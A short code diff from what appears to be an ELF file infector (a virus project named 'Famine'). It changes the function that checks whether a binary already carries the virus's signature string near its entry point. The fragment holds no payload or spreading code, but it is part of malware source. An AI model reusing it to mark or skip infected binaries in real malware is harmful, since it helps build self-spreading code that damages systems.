@@ -36,14 +36,14 @@ bool    is_infected_general(char *path_file, t_file *file)
     return(0);
 }
 
-bool	is_infected(t_file *file)
+bool	is_infected(char *data)
 {
 	Elf64_Ehdr          *header;
 	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
 	int i;
 
 	i = 0;
-	header = (Elf64_Ehdr *)file->data;
+	header = (Elf64_Ehdr *)data;
 	// header->e_entry - 8; // fingerprint
 	// header->e_entry - 62; // start signature
 	while(sig[i])
